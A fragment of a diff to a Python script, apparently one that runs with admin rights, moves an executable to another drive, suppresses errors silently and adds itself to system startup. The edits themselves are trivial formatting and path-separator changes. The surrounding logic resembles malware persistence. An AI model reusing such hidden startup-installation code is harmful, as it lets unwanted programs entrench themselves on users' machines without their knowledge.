@@ -26,8 +26,7 @@ if run_as_admin():
                     drive_letter = partition.device[0].upper() + ":"
                     drive_letters.add(drive_letter)
 
-            return sorted(drive_letters)
-    
+            return sorted(drive_letters)    
     def move_exe_file(source_path, destination_path):
         try:
             # Check if the source file exists
@@ -41,7 +40,6 @@ if run_as_admin():
         except Exception as e:
             # print(f"Error: {e}")
             pass
-
     def add_to_startup(Drive_Letter):
 
         # Get the path to the executable (assuming it's in the same directory)
@@ -63,7 +61,7 @@ if run_as_admin():
     #  list_drive_letters Fuction 🟡
     drive_letters = list_drive_letters()
     A=drive_letters[1]
-    drive_letter = A+"\\"
+    drive_letter = A+"/"
 
 
     #  move_exe_file Fuction 🟡
